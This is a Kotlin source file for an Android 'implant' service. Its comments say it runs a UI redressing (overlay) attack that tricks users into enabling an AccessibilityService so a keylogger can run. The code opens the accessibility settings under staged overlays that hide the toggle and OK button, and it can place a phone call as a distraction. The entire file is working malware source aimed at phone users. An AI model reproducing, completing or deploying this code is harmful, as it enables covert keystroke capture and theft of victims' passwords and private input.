/*
* Android Service that draws an overlay over the system contents.
* This will be used to launch a UI redressing attack to trick the user into enabling our
* AccessibilityService and activating our KeyLogger.
* */
package com.cooperthecoder.implant.cloak

import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import com.cooperthecoder.implant.Config


class CloakService : Service() {

    private lateinit var attack: RedressingAttack

    companion object {
        private val TAG: String = CloakService::class.java.name
        private const val ACTION_ENABLE_DAGGER_DISTRACTION = "enable_dagger"
        private const val ACTION_PHONE_CALL_DISTRACTION = "action_distraction"


        fun startDaggerDistraction(context: Context) {
            // Start the cloak service to begin the UI redressing attack
            val intent = Intent(context, CloakService::class.java)
            intent.action = CloakService.ACTION_ENABLE_DAGGER_DISTRACTION
            context.startService(intent)
            // Launch victim settings activity and close this activity.
            val flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .setFlags(flags))
        }

        fun startPhoneCallDistraction(context: Context, phoneNumber: String) {
            val phoneCallIntent = Intent(Intent.ACTION_CALL)
            phoneCallIntent.data = Uri.parse(phoneNumber)
            val distractionIntent = Intent(context, CloakService::class.java)
            distractionIntent.action = CloakService.ACTION_PHONE_CALL_DISTRACTION
            context.startService(distractionIntent)
            context.startActivity(phoneCallIntent)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val listener = {
            Log.d(TAG, "Stage completed")
            // Go to the home screen if there are no more stages
            if (!attack.moveToNext()) {
                attack.stopAttack()
                stopSelf()
                val goHome = Intent(Intent.ACTION_MAIN)
                goHome.addCategory(Intent.CATEGORY_HOME)
                goHome.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                Thread.sleep(Config.OVERLAY_DELAY)
                startActivity(goHome)
            }
        }
        val stages = ArrayList<Stage>()
        when (intent.action) {
            ACTION_ENABLE_DAGGER_DISTRACTION -> {
                stages.add(AccessibilityStage(applicationContext, listener))
                stages.add(ToggleSwitchStage(applicationContext, listener))
                stages.add(OkButtonStage(applicationContext, listener))
            }

            ACTION_PHONE_CALL_DISTRACTION -> {
                stages.add(DistractionStage(applicationContext, listener))
            }
        }
        attack = RedressingAttack(stages)
        attack.moveToNext()
        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        attack.stopAttack()
    }

}

